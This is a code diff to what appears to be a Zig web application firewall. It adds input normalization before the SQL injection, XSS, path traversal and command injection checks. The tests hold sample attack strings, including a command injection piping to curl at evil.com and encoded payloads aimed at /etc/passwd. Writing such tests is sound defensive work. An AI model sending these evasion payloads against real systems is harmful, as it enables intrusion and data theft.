@@ -172,6 +172,7 @@ pub fn checkRce(text: []const u8) ?Violation {
 }
 
 const rule = @import("rule.zig");
+const normalizer = @import("normalizer.zig");
 
 pub fn inspectText(text: []const u8) ?Violation {
     if (text.len == 0) return null;
@@ -179,6 +180,15 @@ pub fn inspectText(text: []const u8) ?Violation {
     if (checkSqli(text)) |v| return v;
     if (checkXss(text)) |v| return v;
     if (checkRce(text)) |v| return v;
+
+    var norm_buf: [2048]u8 = undefined;
+    const normalized = normalizer.canonicalize(text, &norm_buf);
+    if (normalized.len > 0 and !std.mem.eql(u8, normalized, text)) {
+        if (checkPathTraversal(normalized)) |v| return v;
+        if (checkSqli(normalized)) |v| return v;
+        if (checkXss(normalized)) |v| return v;
+        if (checkRce(normalized)) |v| return v;
+    }
     return null;
 }
 
@@ -227,4 +237,15 @@ test "checkRce detects command injections" {
     try std.testing.expect(checkRce("127.0.0.1; /bin/sh") != null);
     try std.testing.expect(checkRce("input|curl http://evil.com") != null);
     try std.testing.expect(checkRce("status ok") == null);
+}
+
+test "inspectText blocks obfuscated WAF evasion attacks" {
+    // URL-encoded SQLi
+    try std.testing.expect(inspectText("id=%27%20or%20%271%27=%271") != null);
+    // Comment-obfuscated SQLi
+    try std.testing.expect(inspectText("1'/**/UnIoN/**/SeLeCt/**/1") != null);
+    // Double-encoded Path Traversal
+    try std.testing.expect(inspectText("/api/%252e%252e/%252e%252e/etc/passwd") != null);
+    // URL-encoded XSS
+    try std.testing.expect(inspectText("<img%20src=x%20onerror=alert(1)>") != null);
 }
